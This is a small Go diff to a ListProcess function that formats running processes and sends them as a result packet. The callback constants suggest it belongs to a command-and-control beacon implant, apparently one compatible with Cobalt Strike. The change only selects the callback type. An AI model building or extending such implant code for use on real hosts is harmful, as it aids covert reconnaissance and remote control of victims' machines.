@@ -30,11 +30,15 @@ func ListProcess(pendingRequest []byte) error {
 
 		result += fmt.Sprintf("\n%s\t%d\t%d\t%s\t%s\t%d", name, pPid, pid, archString, owner, sessionId)
 	}
-	//fmt.Println(title)
-
+	// command line ps
 	resultBytes := append(pendingRequest, []byte(result)...)
-	finalPacket := packet.MakePacket(CALLBACK_PENDING, resultBytes)
-	packet.PushResult(finalPacket)
+	if binary.BigEndian.Uint32(pendingRequest) == 0 {
+		finalPacket := packet.MakePacket(CALLBACK_PROCESS_LIST, resultBytes)
+		packet.PushResult(finalPacket)
+	} else {
+		finalPacket := packet.MakePacket(CALLBACK_PENDING, resultBytes)
+		packet.PushResult(finalPacket)
+	}
 	return nil
 }
 
